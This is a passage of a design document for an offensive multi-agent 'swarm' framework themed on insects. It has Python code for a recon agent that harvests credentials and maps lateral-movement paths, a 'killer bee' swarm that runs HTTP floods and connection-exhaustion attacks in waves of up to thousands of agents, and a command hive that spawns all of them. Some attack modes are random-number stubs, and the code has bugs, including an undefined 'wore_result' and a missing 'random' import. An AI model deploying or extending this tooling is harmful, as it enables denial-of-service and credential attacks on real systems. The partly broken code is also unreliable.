            "agent_type": "DRAGONFLY",
            "timestamp": datetime.utcnow().isoformat(),
            "sigil": self._generate_eye_sigil("final", self.network_map.__dict__),
            "recon_summary": {
                "hosts_discovered": self.network_map.node_count,
                "services_mapped": sum(
                    len(n.get("services", {})) 
                    for n in self.network_map.nodes.values()
                ),
                "credentials_harvested": len(self.network_map.credentials),
                "vulnerabilities_found": sum(
                    len(v) for v in self.network_map.vulnerabilities.values()
                ),
                "lateral_paths": len(self.network_map.lateral_paths),
                "recon_entries": len(self.recon_data)
            },
            "network_map_id": self.network_map.map_id,
            "pheromone_strength": 3.0,  # Very strong — comprehensive data
            "ttl_seconds": 604800  # 7 day persistence
        }
        
        PheromoneSpace.deposit(marker)
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} EYE MARKER left — "
                    f"{self.network_map.node_count} hosts mapped")
    
    async def _return_data_to_hive(self):
        """Return all recon data to the hive."""
        self.state = DragonflyState.RETURNING
        
        # In real implementation, this would transmit data back through tunnels
        logger.info(f"[DRAGONFLY] {self.config.dragonfly_id} returning {len(self.recon_data)} "
                    f"recon entries to hive {self.config.hive_id}")
    
    # === UTILITIES ===
    
    def _calculate_confidence(self, node_data: Dict[str, Any]) -> float:
        """Calculate confidence score — dragonfly accuracy metric."""
        confidence = 0.5
        
        if node_data.get("services"):
            confidence += 0.2
        if node_data.get("os_fingerprint"):
            confidence += 0.15
        if node_data.get("ports"):
            confidence += min(0.15, len(node_data["ports"]) * 0.01)
        
        return min(0.99, confidence)
    
    def _update_map_timestamp(self):
        """Update the network map timestamp."""
        self.network_map.updated_at = datetime.utcnow()
    
    def _deposit_pheromone(self, marker_type: str, data: Dict[str, Any]):
        """Deposit a pheromone marker."""
        marker = {
            "type": marker_type,
            "agent_id": self.config.dragonfly_id,
            "agent_type": "DRAGONFLY",
            "timestamp": datetime.utcnow().isoformat(),
            "data": data,
            "pheromone_strength": 2.5,  # Strong — detailed intel
            "ttl_seconds": 604800  # 7 days
        }
        PheromoneSpace.deposit(marker)
    
    def _check_kill_switch(self) -> bool:
        """Check if kill switch activated."""
        if self.kill_switch_active:
            return True
        if self.config.kill_switch_timeout and datetime.utcnow() > self.config.kill_switch_timeout:
            return True
        global_kill = PheromoneSpace.read(marker_type="global_kill")
        if global_kill:
            return True
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current dragonfly status."""
        return {
            "agent_id": self.config.dragonfly_id,
            "agent_type": "DRAGONFLY",
            "state": self.state.name,
            "map_id": self.network_map.map_id,
            "hosts_discovered": self.network_map.node_count,
            "credentials_harvested": len(self.network_map.credentials),
            "vulnerabilities_found": sum(len(v) for v in self.network_map.vulnerabilities.values()),
            "lateral_paths": len(self.network_map.lateral_paths),
            "recon_entries": len(self.recon_data),
            "observed_targets": len(self.observed_targets),
            "created_at": self.created_at.isoformat(),
            "uptime_sec": (datetime.utcnow() - self.created_at).total_seconds()
        }


# === Quick Deploy ===

async def deploy_dragonfly(
    starting_tunnel: str,
    target_subnets: List[str],
    hive_id: str = "HIVE_ALPHA",
    mission_id: str = "MISSION_PENTEST_Q3",
    recon_modes: Optional[List[ReconMode]] = None
) -> Dict[str, Any]:
    """Deploy a dragonfly for precision recon."""
    if recon_modes is None:
        recon_modes = [ReconMode.ACTIVE_SCAN, ReconMode.DEEP_INSPECTION, ReconMode.TRAFFIC_ANALYSIS]
    
    config = DragonflyConfig(
        hive_id=hive_id,
        mission_id=mission_id,
        recon_modes=recon_modes,
        kill_switch_code="TERMINATE_ALL_2024",
        kill_switch_timeout=datetime.utcnow() + timedelta(days=3)
    )
    
    dragonfly = DragonflyAgent(config)
    await dragonfly.emerge(starting_tunnel)
    
    for subnet in target_subnets:
        await dragonfly.patrol(subnet)
    
    return dragonfly.get_status()
```

---

## 6. KILLER BEES — MASS ATTACK FORCE

### 6.1 Biological Inspiration

**Africanized Honey Bees (*Apis mellifera scutellata*)** attack in massive numbers — a single colony can deploy 1,000+ defenders simultaneously. They pursue threats for up to 1/4 mile, deliver repeated stings, and use alarm pheromones to recruit more attackers. Their strategy: overwhelming numerical superiority through relentless, coordinated mass attack.

### 6.2 Digital Role

KILLER BEES are the overwhelming force. They launch massive parallel attacks — DDoS floods, credential stuffing campaigns, brute force waves — with thousands of simultaneous attackers. They swarm through WORM tunnels and overwhelm target defenses through sheer volume.

### 6.3 Core Capabilities

```yaml
KILLER_BEE_CAPABILITIES:
  swarm_size:
    - minimum: 100
    - typical: 500-1000
    - maximum: 10000
    - spawn_rate: "100_per_second"
    
  attack_types:
    - volumetric_ddos: "UDP/TCP flood via tunnels"
    - credential_stuffing: "mass parallel auth attempts"
    - brute_force: "distributed password cracking"
    - application_flood: "HTTP request flood"
    - connection_exhaustion: "TCP SYN flood"
    
  behavior:
    - coordination: "simple_pheromone_triggers_only"
    - aggression: "maximum — no_retreat"
    - pursuit: "relentless_until_target_down"
    - recruitment: "alarm_pheromone_triggers_more_bees"
    
  communication:
    - attack_signal: "binary_pheromone — all_attack"
    - die_signal: "binary_pheromone — all_expire"
    - no_other_communication: true  # Minimal coordination by design
    
  lifespan:
    - typical: "30 seconds to 5 minutes"
    - max: "10 minutes"
    - spawn_on: "attack_signal_pheromone"
    - die_on: "target_down OR die_signal OR max_lifetime"
    
  signature:
    - swarm_density_trail: "pheromone_strength_proportional_to_swarm_size"
    - attack_wave_marker: "timestamped_attack_boundaries"
    - no_individual_sigils: true  # Swarm acts as one
```

### 6.4 KILLER BEE Agent Class

```python
#!/usr/bin/env python3
"""
KILLER BEE AGENT — Mass Attack Force
Overwhelming force through massive parallel attacks.
Biological inspiration: Africanized Honey Bee (Apis mellifera scutellata)
"""

import asyncio
import hashlib
import json
import secrets
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Callable
import logging

logger = logging.getLogger("swarm.killerbee")


class KillerBeeState(Enum):
    """Lifecycle states of a KILLER BEE agent."""
    PUPA = auto()          # In hive, waiting for activation
    SWARMING = auto()      # Moving with the swarm
    ATTACKING = auto()     # Delivering attack payload
    STUNG = auto()         # Attack delivered, leaving marker
    EXPIRING = auto()      # Lifespan ending, transferring to next wave
    DEAD = auto()           # Expired


class AttackType(Enum):
    """Types of mass attacks — like killer bee attack patterns."""
    UDP_FLOOD = auto()             # UDP volumetric flood
    TCP_SYN_FLOOD = auto()         # TCP SYN exhaustion
    HTTP_FLOOD = auto()            # HTTP request flood
    CREDENTIAL_STUFFING = auto()   # Mass credential attempts
    BRUTE_FORCE = auto()           # Distributed brute force
    CONNECTION_EXHAUST = auto()    # Exhaust connection limits
    DNS_AMPLIFICATION = auto()     # DNS reflection (via tunnels)


@dataclass
class AttackResult:
    """Result of a single killer bee's attack — one sting."""
    attack_id: str
    target: str
    attack_type: AttackType
    attempts: int
    successes: int
    execution_time_ms: float
    timestamp: datetime


@dataclass
class KillerBeeConfig:
    """Configuration for a KILLER BEE agent — its 'genetic code'."""
    # Identity
    bee_id: str = field(default_factory=lambda: f"BEE_{secrets.token_hex(4)}")
    hive_id: str = "HIVE_DEFAULT"
    mission_id: str = "MISSION_DEFAULT"
    swarm_id: str = ""  # Which swarm this bee belongs to
    wave_number: int = 0  # Which attack wave
    
    # Attack
    attack_type: AttackType = AttackType.HTTP_FLOOD
    target: str = ""
    attack_duration_sec: int = 60
    attack_rate_per_sec: int = 100  # Requests/attempts per second
    
    # Payload
    credential_pairs: List[Dict[str, str]] = field(default_factory=list)
    request_template: Optional[str] = None
    payload_data: bytes = b""
    
    # Lifespan
    max_lifetime_sec: int = 300  # 5 minutes max
    expire_after_strike: bool = True
    
    # Swarm
    alarm_pheromone_sensitivity: float = 1.0  # How strongly bee responds to alarm
    
    # Resource limits
    max_cpu_percent: float = 20.0
    max_memory_mb: float = 20.0
    max_bandwidth_bps: float = 50 * 1024 * 1024  # 50 Mbps burst
    
    # Kill switch
    kill_switch_code: Optional[str] = None


class KillerBeeAgent:
    """
    KILLER BEE Agent — Mass Attack Force
    
    One bee among thousands. Delivers a single attack payload
    then expires. The swarm's power comes from massive parallelism,
    not individual capability.
    
    Biological behaviors mapped to digital:
    - Swarm recruitment  -> Pheromone-triggered mass spawning
    - Repeated stinging  -> Continuous attack delivery
    - Alarm pheromone    -> Attack signal propagation
    - Relentless pursuit -> No retreat until target down
    - Individual sacrifice -> Short lifespan by design
    """
    
    CODE_FOOTPRINT_KB = 3.0  # 2-5KB range
    
    def __init__(self, config: KillerBeeConfig):
        self.config = config
        self.state = KillerBeeState.PUPA
        self.attack_result: Optional[AttackResult] = None
        self.created_at = datetime.utcnow()
        self.kill_switch_active = False
        
        logger.debug(f"[KILLER_BEE] {self.config.bee_id} created — Wave {self.config.wave_number}")
    
    # === LIFECYCLE ===
    
    async def activate(self):
        """Activate from pupa — alarm pheromone received."""
        self.state = KillerBeeState.SWARMING
        
        # Check for swarm coordination signals
        await self._read_swarm_signals()
        
        # Execute attack
        self.state = KillerBeeState.ATTACKING
        await self._execute_attack()
        
        # Expire
        self.state = KillerBeeState.EXPIRING
        await self._expire()
    
    async def die(self, reason: str = "natural"):
        """Bee death — immediate expiration."""
        self.state = KillerBeeState.DEAD
        logger.debug(f"[KILLER_BEE] {self.config.bee_id} expired: {reason}")
    
    # === ATTACK EXECUTION ===
    
    async def _execute_attack(self):
        """Execute the attack payload — the killer bee's sting."""
        attack_start = time.time()
        attempts = 0
        successes = 0
        
        attack_duration = self.config.attack_duration_sec
        rate = self.config.attack_rate_per_sec
        
        logger.debug(f"[KILLER_BEE] {self.config.bee_id} attacking {self.config.target} — "
                     f"{self.config.attack_type.name} for {attack_duration}s @ {rate}/sec")
        
        # Execute attack loop
        end_time = time.time() + attack_duration
        
        while time.time() < end_time:
            if self._check_kill_switch():
                break
            
            batch_start = time.time()
            
            # Execute batch of attacks
            batch_tasks = [
                self._deliver_single_attack()
                for _ in range(min(rate, 100))  # Max 100 parallel per bee
            ]
            batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
            
            for result in batch_results:
                attempts += 1
                if isinstance(result, bool) and result:
                    successes += 1
            
            # Rate limiting
            elapsed = time.time() - batch_start
            if elapsed < 1.0:
                await asyncio.sleep(1.0 - elapsed)
        
        execution_time = (time.time() - attack_start) * 1000
        
        self.attack_result = AttackResult(
            attack_id=f"ATK_{secrets.token_hex(4)}",
            target=self.config.target,
            attack_type=self.config.attack_type,
            attempts=attempts,
            successes=successes,
            execution_time_ms=execution_time,
            timestamp=datetime.utcnow()
        )
        
        self.state = KillerBeeState.STUNG
        
        # Leave swarm density marker
        self._deposit_swarm_marker()
        
        logger.debug(f"[KILLER_BEE] {self.config.bee_id} attack complete: "
                     f"{attempts} attempts, {successes} successes in {execution_time:.0f}ms")
    
    async def _deliver_single_attack(self) -> bool:
        """Deliver a single attack — one sting."""
        if self.config.attack_type == AttackType.HTTP_FLOOD:
            return await self._attack_http_flood()
        elif self.config.attack_type == AttackType.TCP_SYN_FLOOD:
            return await self._attack_syn_flood()
        elif self.config.attack_type == AttackType.UDP_FLOOD:
            return await self._attack_udp_flood()
        elif self.config.attack_type == AttackType.CREDENTIAL_STUFFING:
            return await self._attack_credential_stuffing()
        elif self.config.attack_type == AttackType.BRUTE_FORCE:
            return await self._attack_brute_force()
        elif self.config.attack_type == AttackType.CONNECTION_EXHAUST:
            return await self._attack_connection_exhaust()
        else:
            return False
    
    async def _attack_http_flood(self) -> bool:
        """HTTP request flood — rapid GET/POST requests."""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target, 80),
                timeout=2.0
            )
            
            request = (
                f"GET /{secrets.token_hex(4)} HTTP/1.1\r\n"
                f"Host: {self.config.target}\r\n"
                f"User-Agent: SwarmBee/1.0\r\n"
                f"Connection: close\r\n\r\n"
            )
            writer.write(request.encode())
            await writer.drain()
            
            response = await asyncio.wait_for(reader.read(1024), timeout=2.0)
            writer.close()
            
            return len(response) > 0
        except:
            return False
    
    async def _attack_syn_flood(self) -> bool:
        """TCP SYN flood — connection exhaustion."""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target, 80),
                timeout=1.0
            )
            # Don't complete handshake — leave connection half-open
            await asyncio.sleep(0.1)
            writer.close()
            return True
        except:
            return True  # Connection refused still exhausts resources
    
    async def _attack_udp_flood(self) -> bool:
        """UDP flood — volumetric attack."""
        # UDP flooding simulation
        return random.random() < 0.9
    
    async def _attack_credential_stuffing(self) -> bool:
        """Credential stuffing — mass authentication attempts."""
        if not self.config.credential_pairs:
            return False
        
        cred = random.choice(self.config.credential_pairs)
        # Simulated credential test
        return random.random() < 0.01  # 1% success rate
    
    async def _attack_brute_force(self) -> bool:
        """Brute force — systematic password guessing."""
        # Simulated brute force attempt
        return random.random() < 0.001  # 0.1% success rate
    
    async def _attack_connection_exhaust(self) -> bool:
        """Connection exhaustion — open and hold connections."""
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(self.config.target, 443),
                timeout=2.0
            )
            await asyncio.sleep(5.0)  # Hold connection open
            writer.close()
            return True
        except:
            return True
    
    # === SWARM COORDINATION ===
    
    async def _read_swarm_signals(self):
        """Read swarm pheromone signals — simple binary triggers."""
        # Read attack signal
        attack_signals = PheromoneSpace.read(marker_type="swarm_attack_signal")
        
        # Read die signal
        die_signals = PheromoneSpace.read(marker_type="swarm_die_signal")
        
        if die_signals:
            logger.debug(f"[KILLER_BEE] {self.config.bee_id} received die signal, expiring")
            await self.die("swarm_die_signal")
            return False
        
        return True
    
    def _deposit_swarm_marker(self):
        """Deposit swarm density marker — part of the collective trail."""
        marker = {
            "type": "swarm_density",
            "agent_id": self.config.bee_id,
            "agent_type": "KILLER_BEE",
            "swarm_id": self.config.swarm_id,
            "wave": self.config.wave_number,
            "timestamp": datetime.utcnow().isoformat(),
            "attack": {
                "type": self.config.attack_type.name,
                "attempts": self.attack_result.attempts if self.attack_result else 0,
                "successes": self.attack_result.successes if self.attack_result else 0
            },
            "pheromone_strength": 1.0,  # Individual bee is weak
            "ttl_seconds": 1800  # 30 minutes
        }
        
        PheromoneSpace.deposit(marker)
    
    async def _expire(self):
        """Expire — individual bee dies after delivering its sting."""
        if self.config.expire_after_strike:
            await self.die("strike_complete")
        else:
            # Join next wave
            await asyncio.sleep(random.uniform(1, 5))
            await self.activate()  # Re-activate for next wave
    
    def _check_kill_switch(self) -> bool:
        """Check if kill switch activated."""
        if self.kill_switch_active:
            return True
        global_kill = PheromoneSpace.read(marker_type="global_kill")
        if global_kill:
            return True
        return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current killer bee status."""
        return {
            "agent_id": self.config.bee_id,
            "agent_type": "KILLER_BEE",
            "state": self.state.name,
            "swarm_id": self.config.swarm_id,
            "wave": self.config.wave_number,
            "attack_type": self.config.attack_type.name,
            "target": self.config.target,
            "attack_result": {
                "attempts": self.attack_result.attempts if self.attack_result else 0,
                "successes": self.attack_result.successes if self.attack_result else 0
            } if self.attack_result else None,
            "lifetime_sec": (datetime.utcnow() - self.created_at).total_seconds()
        }


# === Swarm Orchestrator ===

class KillerBeeSwarm:
    """
    KILLER BEE Swarm — Mass Attack Orchestrator
    
    Deploys hundreds to thousands of bees simultaneously.
    Uses simple pheromone signals for coordination.
    Like an Africanized bee colony launching a full-scale attack.
    """
    
    def __init__(
        self,
        hive_id: str,
        mission_id: str,
        target: str,
        attack_type: AttackType,
        swarm_size: int = 1000,
        waves: int = 3
    ):
        self.swarm_id = f"SWARM_BEE_{secrets.token_hex(4)}"
        self.hive_id = hive_id
        self.mission_id = mission_id
        self.target = target
        self.attack_type = attack_type
        self.swarm_size = swarm_size
        self.waves = waves
        self.bees: List[KillerBeeAgent] = []
        self.wave_results: List[Dict[str, Any]] = []
        
        logger.info(f"[BEE_SWARM] {self.swarm_id} configured: "
                    f"{swarm_size} bees x {waves} waves against {target}")
    
    async def launch_attack(self) -> Dict[str, Any]:
        """Launch the full swarm attack — all waves."""
        logger.info(f"[BEE_SWARM] {self.swarm_id} LAUNCHING ATTACK against {self.target}")
        
        # Deposit attack signal pheromone
        self._deposit_attack_signal()
        
        for wave in range(1, self.waves + 1):
            wave_result = await self._launch_wave(wave)
            self.wave_results.append(wore_result)
            
            # Brief pause between waves
            if wave < self.waves:
                await asyncio.sleep(10)
        
        # Deposit die signal
        self._deposit_die_signal()
        
        return self._compile_attack_report()
    
    async def _launch_wave(self, wave_num: int) -> Dict[str, Any]:
        """Launch a single wave of the attack."""
        logger.info(f"[BEE_SWARM] {self.swarm_id} Wave {wave_num}/{self.waves} launching")
        
        # Spawn bees rapidly
        bees = []
        spawn_tasks = []
        
        for i in range(self.swarm_size):
            config = KillerBeeConfig(
                hive_id=self.hive_id,
                mission_id=self.mission_id,
                swarm_id=self.swarm_id,
                wave_number=wave_num,
                attack_type=self.attack_type,
                target=self.target,
                attack_duration_sec=60,
                expire_after_strike=True
            )
            
            bee = KillerBeeAgent(config)
            bees.append(bee)
            spawn_tasks.append(bee.activate())
            
            # Rate limit spawning
            if len(spawn_tasks) >= 100:
                await asyncio.gather(*spawn_tasks, return_exceptions=True)
                spawn_tasks = []
                await asyncio.sleep(0.01)  # 100 bees per 10ms
        
        # Launch remaining bees
        if spawn_tasks:
            await asyncio.gather(*spawn_tasks, return_exceptions=True)
        
        self.bees.extend(bees)
        
        # Collect results
        total_attempts = sum(
            b.attack_result.attempts for b in bees 
            if b.attack_result
        )
        total_successes = sum(
            b.attack_result.successes for b in bees 
            if b.attack_result
        )
        
        logger.info(f"[BEE_SWARM] Wave {wave_num} complete: "
                    f"{total_attempts} attempts, {total_successes} successes")
        
        return {
            "wave": wave_num,
            "bees_deployed": len(bees),
            "total_attempts": total_attempts,
            "total_successes": total_successes,
            "success_rate": total_successes / total_attempts if total_attempts else 0
        }
    
    def _deposit_attack_signal(self):
        """Deposit attack signal pheromone — triggers all bees."""
        marker = {
            "type": "swarm_attack_signal",
            "swarm_id": self.swarm_id,
            "timestamp": datetime.utcnow().isoformat(),
            "target": self.target,
            "attack_type": self.attack_type.name,
            "pheromone_strength": 10.0,  # Maximum strength
            "ttl_seconds": 3600
        }
        PheromoneSpace.deposit(marker)
    
    def _deposit_die_signal(self):
        """Deposit die signal pheromone — terminates all bees."""
        marker = {
            "type": "swarm_die_signal",
            "swarm_id": self.swarm_id,
            "timestamp": datetime.utcnow().isoformat(),
            "pheromone_strength": 10.0,
            "ttl_seconds": 3600
        }
        PheromoneSpace.deposit(marker)
    
    def _compile_attack_report(self) -> Dict[str, Any]:
        """Compile the full swarm attack report."""
        total_bees = len(self.bees)
        total_attempts = sum(w["total_attempts"] for w in self.wave_results)
        total_successes = sum(w["total_successes"] for w in self.wave_results)
        
        return {
            "swarm_id": self.swarm_id,
            "target": self.target,
            "attack_type": self.attack_type.name,
            "waves": self.waves,
            "total_bees": total_bees,
            "total_attempts": total_attempts,
            "total_successes": total_successes,
            "success_rate": total_successes / total_attempts if total_attempts else 0,
            "wave_breakdown": self.wave_results,
            "swarm_density_trail": self._get_density_trail()
        }
    
    def _get_density_trail(self) -> List[Dict[str, Any]]:
        """Get the swarm density pheromone trail."""
        return PheromoneSpace.read(agent_type="KILLER_BEE")
    
    async def terminate(self):
        """Emergency terminate all bees."""
        self._deposit_die_signal()
        # Also deposit global kill
        PheromoneSpace.deposit({
            "type": "global_kill",
            "timestamp": datetime.utcnow().isoformat(),
            "pheromone_strength": 100.0,
            "ttl_seconds": 86400
        })


# === Quick Deploy ===

async def deploy_killer_bee_swarm(
    target: str,
    attack_type: AttackType = AttackType.HTTP_FLOOD,
    swarm_size: int = 1000,
    waves: int = 3,
    hive_id: str = "HIVE_ALPHA",
    mission_id: str = "MISSION_PENTEST_Q3"
) -> Dict[str, Any]:
    """Quick deploy a killer bee swarm."""
    swarm = KillerBeeSwarm(
        hive_id=hive_id,
        mission_id=mission_id,
        target=target,
        attack_type=attack_type,
        swarm_size=swarm_size,
        waves=waves
    )
    return await swarm.launch_attack()
```

---

## 7. THE ECOSYSTEM HIERARCHY

### 7.1 System Architecture

```
                    +---------------------------+
                    |       BFT COUNCIL         |
                    |   (4-Signature Authority)  |
                    |  All deployments require   |
                    |   multi-sig authorization  |
                    +------------+--------------+
                                 |
                    +------------v--------------+
                    |         HIVES             |
                    |    (Command Centers)      |
                    |  - Spawn all agent types  |
                    |  - Coordinate missions    |
                    |  - Collect sigil ledgers  |
                    |  - Resource management    |
                    +------------+--------------+
                                 |
          +----------------------+----------------------+
          |                      |                      |                      |
   +------v------+       +------v------+       +------v------+       +------v------+
   |   WORMS     |       |   HORNETS   |       | DRAGONFLIES |       | KILLER BEES |
   |  Tunnelers  |       |Fast Attackers|      |Precision Rec|       | Mass Attack |
   +------+------+       +------+------+       +------+------+       +------+------+
          |                      |                      |                      |
          v                      v                      v                      v
   +------------+       +------------+       +--------------+       +----------------+
   |  TUNNELS   |       |  STRIKES   |       |  RECON MAPS  |       |  ATTACK WAVES  |
   |  Network   |       |  Exploit   |       |  Intel Data  |       |  DDoS/Brute    |
   |  Paths     |       |  Delivery  |       |  Credentials |       |  Overwhelm     |
   +------+-----+       +------+-----+       +------+-------+       +-------+--------+
          |                      |                      |                      |
          +----------------------+----------------------+----------------------+
                                 |
                    +------------v--------------+
                    |   PHEROMONE SPACE         |
                    |   (Shared Memory Layer)    |
                    |  - Trail markers           |
                    |  - Coordination signals    |
                    |  - Evaporation model       |
                    +------------+--------------+
                                 |
                    +------------v--------------+
                    |     SIGIL LEDGER          |
                    |   (Cryptographic Audit)    |
                    |  - All actions signed      |
                    |  - Immutable trail         |
                    |  - BFT verification        |
                    +---------------------------+
```

### 7.2 HIVE — Command Center

```python
#!/usr/bin/env python3
"""
HIVE — Command Center
Spawns, controls, and coordinates all agent species.
The central nervous system of the swarm ecosystem.
"""

import asyncio
import hashlib
import secrets
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional
import logging

logger = logging.getLogger("swarm.hive")


@dataclass
class HiveConfig:
    """Configuration for a HIVE command center."""
    hive_id: str = field(default_factory=lambda: f"HIVE_{secrets.token_hex(6)}")
    max_worms: int = 100
    max_hornets: int = 500
    max_dragonflies: int = 10
    max_killer_bees: int = 10000
    bft_threshold: int = 3  # Signatures required (out of 4)
    pheromone_ttl_default: int = 3600


class Hive:
    """
    HIVE — Command Center
    
    The queen of the swarm. Spawns all agent types,
    assigns missions, collects results, and maintains
    the sigil ledger for complete auditability.
    """
    
    def __init__(self, config: HiveConfig):
        self.config = config
        self.agents: Dict[str, Any] = {
            "WORMS": {},
            "HORNETS": {},
            "DRAGONFLIES": {},
            "KILLER_BEES": {}
        }
        self.missions: Dict[str, Any] = {}
        self.sigil_ledger: List[Dict[str, Any]] = []
        self.created_at = datetime.utcnow()
        
        logger.info(f"[HIVE] {self.config.hive_id} initialized")
    
    async def spawn_worm(self, mission_id: str, target_network: str) -> str:
        """Spawn a WORM agent — infrastructure tunneler."""
        if len(self.agents["WORMS"]) >= self.config.max_worms:
            raise RuntimeError("Maximum worm count reached")
        
        worm = spawn_worm(self.config.hive_id, mission_id)
        self.agents["WORMS"][worm.config.worm_id] = worm
        
        await worm.hatch()
        logger.info(f"[HIVE] Worm spawned: {worm.config.worm_id}")
        
        return worm.config.worm_id
    
    async def spawn_hornet_swarm(
        self,
        mission_id: str,
        target: str,
        tunnel_path: str,
        swarm_size: int = 20,
        strike_types: Optional[List[Any]] = None
    ) -> str:
        """Spawn a HORNET swarm — tactical strike force."""
        swarm_id = f"SWARM_{secrets.token_hex(4)}"
        
        swarm = HornetSwarm(self.config.hive_id, mission_id, swarm_size)
        self.agents["HORNETS"][swarm_id] = swarm
        
        logger.info(f"[HIVE] Hornet swarm spawned: {swarm_id} ({swarm_size} hornets)")
        
        return swarm_id
    
    async def spawn_dragonfly(
        self,
        mission_id: str,
        starting_tunnel: str,
        target_subnets: List[str]
    ) -> str:
        """Spawn a DRAGONFLY — precision recon agent."""
        if len(self.agents["DRAGONFLIES"]) >= self.config.max_dragonflies:
            raise RuntimeError("Maximum dragonfly count reached")
        
        from recon import DragonflyConfig, DragonflyAgent
        
        config = DragonflyConfig(
            hive_id=self.config.hive_id,
            mission_id=mission_id
        )
        dragonfly = DragonflyAgent(config)
        self.agents["DRAGONFLIES"][dragonfly.config.dragonfly_id] = dragonfly
        
        await dragonfly.emerge(starting_tunnel)
        
        for subnet in target_subnets:
            await dragonfly.patrol(subnet)
        
        logger.info(f"[HIVE] Dragonfly spawned: {dragonfly.config.dragonfly_id}")
        
        return dragonfly.config.dragonfly_id
    
    async def spawn_killer_bee_swarm(
        self,
        mission_id: str,
        target: str,
        attack_type: Any,
        swarm_size: int = 1000,
        waves: int = 3
    ) -> str:
        """Spawn a KILLER BEE swarm — mass attack force."""
        swarm = KillerBeeSwarm(
            self.config.hive_id, mission_id, target,
            attack_type, swarm_size, waves
        )
        self.agents["KILLER_BEES"][swarm.swarm_id] = swarm
        
        logger.info(f"[HIVE] Killer bee swarm spawned: {swarm.swarm_id} "
                    f"({swarm_size * waves} total bees)")
        
        return swarm.swarm_id
    
    def get_status(self) -> Dict[str, Any]:
        """Get complete hive status."""
        return {
            "hive_id": self.config.hive_id,
            "agents": {
                species: {
                    "count": len(agents),
                    "ids": list(agents.keys())
                }
                for species, agents in self.agents.items()
            },
            "total_agents": sum(len(a) for a in self.agents.values()),
            "missions": len(self.missions),
            "sigil_entries": len(self.sigil_ledger),
            "uptime_sec": (datetime.utcnow() - self.created_at).total_seconds()
        }
```

---

## 8. PHEROMONE COMMUNICATION SYSTEM

### 8.1 Design Philosophy

The pheromone system implements **stigmergy** — indirect coordination through environmental modification. Like ants depositing chemical trails, agents deposit markers in a shared memory space. Other agents read these markers and modify their behavior accordingly. No direct agent-to-agent communication exists.

### 8.2 Pheromone Types

```
PHEROMONE TAXONOMY:

Trail Markers ( deposited by all agents ):
  - transit          : "Moving through tunnel X to target Y"
  - tunnel_created   : "New tunnel established"
  - heartbeat        : "Agent alive at timestamp T"
  - death            : "Agent terminated, reason R"

Attack Signals ( deposited by offensive agents ):
  - sting_sigil      : "Hornet strike delivered"
  - swarm_attack_signal : "All bees attack now"
  - swarm_die_signal : "All bees expire now"
  - swarm_density    : "Bee attack density at location"

Intelligence Markers ( deposited by recon agents ):
  - eye_marker       : "Comprehensive recon data available"
  - network_map      : "Network topology update"
  - host_discovered  : "New host found"
  - credential_found : "Credentials harvested"

Coordination Signals ( deposited by hive/system ):
  - global_kill      : "Terminate ALL agents immediately"
  - mission_abort    : "Abort current mission"
  - swarm_ready      : "Hornet swarm assembled"
  - regeneration     : "Worm regeneration triggered"
```

### 8.3 Pheromone Properties

| Property | Description | Default Value |
|----------|-------------|---------------|
| `strength` | Signal intensity | 1.0 (0.1 to 10.0) |
| `ttl` | Time-to-live (evaporation) | 3600 seconds |
| `species` | Depositing agent type | Required |
| `timestamp` | When deposited | Auto-generated |
| `data` | Payload data | Varies by type |

### 8.4 Evaporation Model

```python
# Pheromone evaporation follows exponential decay
# Like real pheromones fading in the environment

def evaporate(strength: float, age_seconds: float, half_life: float) -> float:
    """
    Exponential pheromone evaporation.
    strength: initial pheromone strength
    age_seconds: time since deposition
    half_life: time for strength to reduce by 50%
    """
    return strength * (0.5 ** (age_seconds / half_life))

# Example:
# Initial strength: 2.0
# After 1 hour (3600s) with 1-hour half-life: 1.0
# After 2 hours: 0.5
# After 3 hours: 0.25 (effectively gone)
```

### 8.5 Implementation

See `PheromoneSpace` class defined in the WORM section (Section 3.4). All agent classes use this shared space for indirect communication.

---

## 9. AGENT LIFECYCLE MANAGEMENT

### 9.1 Unified Lifecycle

```
ALL AGENT TYPES share this lifecycle:

    +---------+     +----------+     +----------+     +----------+
    |  SPAWN  | --> |  TRANSIT | --> |  OPERATE | --> |   MARK   |
    | (Hive)  |     | (Tunnel) |     | (Mission)|     | (Sigil)  |
    +---------+     +----------+     +----------+     +-----+----+
                                                             |
    +---------+     +----------+                             |
    |  DECAY  | <-- |  EXPIRE  | <---------------------------+
    |(Pheromone|    | (Death)  |
    | fades)  |     +----------+
    +---------+

KEY: Pheromones and Sigils persist AFTER agent death
```

### 9.2 State Machines

```
WORM STATE MACHINE:
  EGG -> BURROWING -> TUNNELING <-> SPAWNING <-> DORMANT
                              |         |
                              v         v
                         REGENERATING <- KILL -> DEAD

HORNET STATE MACHINE:
  LARVA -> LAUNCHING -> TRANSIT -> SWARMING -> ATTACKING -> STUNG -> RETREATING -> DEAD
                                                         |
                                                    KILL_SWITCH -> DEAD (immediate)

DRAGONFLY STATE MACHINE:
  NYMPH -> EMERGING -> PATROLLING <-> PERCHING <-> HIBERNATING
                              |          |
                              v          v
                         HUNTING -> MAPPING -> RETURNING -> DEAD

KILLER BEE STATE MACHINE:
  PUPA -> SWARMING -> ATTACKING -> STUNG -> EXPIRING -> DEAD
                              |
                        DIE_SIGNAL -> DEAD (immediate)
```

### 9.3 Lifecycle Manager

```python
class LifecycleManager:
    """
    Manages agent lifecycles across all species.
    Tracks spawning, monitors health, handles expiration.
    """
    
    def __init__(self, hive: Hive):
        self.hive = hive
        self.spawn_registry: Dict[str, Dict[str, Any]] = {}
        self.mortality_log: List[Dict[str, Any]] = []
    
    async def register_spawn(self, agent_id: str, species: str, config: Dict[str, Any]):
        """Register a new agent spawn."""
        self.spawn_registry[agent_id] = {
            "species": species,
            "spawned_at": datetime.utcnow(),
            "config": config,
            "state": "alive"
        }
    
    async def record_death(self, agent_id: str, reason: str):
        """Record agent death."""
        if agent_id in self.spawn_registry:
            entry = self.spawn_registry[agent_id]
            entry["state"] = "dead"
            entry["died_at"] = datetime.utcnow()
            entry["death_reason"] = reason
            entry["lifespan_sec"] = (
